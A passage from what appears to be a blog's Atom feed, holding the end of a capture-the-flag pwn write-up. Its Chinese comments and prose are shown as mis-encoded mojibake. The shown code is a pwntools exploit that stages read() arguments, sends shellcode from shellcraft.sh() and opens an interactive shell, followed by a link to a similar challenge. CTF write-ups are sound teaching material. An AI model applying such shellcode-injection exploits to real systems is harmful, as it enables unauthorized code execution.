#read()çš„ä¸‰ä¸ªå‚æ•° 
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x100)

payload += p32(mem_addr)   

p.sendline(payload)
#å·²å®Œæˆäº†ä¿®æ”¹å†…å­˜ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œå°†ç¨‹åºé‡å®šå‘åˆ°äº†ä¿®æ”¹å¥½åçš„å†…å­˜åœ°å€ï¼Œä¼ å…¥shellcode
payload = asm(shellcraft.sh()) 
p.sendline(payload)

p.interactive()
</code></pre>
<hr>
<blockquote>
<p>ç›¸ä¼¼pwnï¼š<br>
<a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/get_started_3dsctf_2016"><font color=YellowGreen>get_started_3dsctf_2016</font></a></p>
</blockquote>
<p>æ³¨æ„:ä¸Šè¿°ä¸‰ç¯‡expï¼ˆå‰ä¸¤ç¯‡VSåä¸€ç¯‡çš„å·®å¼‚ï¼‰ï¼Œå‰é‡åœ¨ç†è§£é€»è¾‘ï¼Œåæ›´èƒ½ååº”ç¨‹åºä¸­æ ˆå˜åŒ–ã€‚å¦<a href="">æ¨¡æ¿åŒ–çš„exp</a></p>
<p>ğŸ˜è‡ªæ­¤ï¼Œå¼€å¯æˆ‘çš„åšå®¢~</p>
]]></content>
    </entry>
</feed>